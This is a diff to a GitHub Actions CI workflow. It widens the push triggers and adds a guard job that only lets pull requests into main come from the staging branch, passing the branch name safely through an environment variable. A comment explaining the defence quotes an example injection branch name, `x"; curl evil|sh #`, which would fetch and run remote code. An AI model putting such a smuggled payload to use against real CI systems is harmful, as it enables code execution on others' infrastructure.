@@ -2,7 +2,7 @@ name: CI
 
 on:
   push:
-    branches: [main]
+    branches: [main, staging, develop]
   pull_request:
   workflow_dispatch:
 
@@ -90,6 +90,29 @@ jobs:
 
       - name: Domain and architecture suites
         run: uv run pytest tests/domain tests/architecture -q
+
+  guard-main-source:
+    name: Main accepts staging only
+    # The branch model is develop -> staging -> main. A ruleset makes this job a required
+    # check on main, so a pull request from anywhere else fails here before a human has to
+    # say no. The repository owner can bypass the ruleset; this guard is for everyone else.
+    if: github.event_name == 'pull_request' && github.base_ref == 'main'
+    runs-on: ubuntu-latest
+    timeout-minutes: 5
+    steps:
+      - name: Head branch must be staging
+        # The branch name reaches the shell through the environment, never through `${{ }}`
+        # interpolation: on a public repository anyone can open a pull request from a fork
+        # whose branch is named `x"; curl evil|sh #`, and template interpolation splices
+        # that text into the script before a shell ever parses it. An env var is data.
+        env:
+          HEAD_REF: ${{ github.head_ref }}
+        run: |
+          if [ "$HEAD_REF" != "staging" ]; then
+            printf '::error::Pull requests into main must come from staging. Merge into staging first.\n'
+            exit 1
+          fi
+          printf 'Head branch is staging — allowed.\n'
 
   hassfest:
     name: Home Assistant manifest
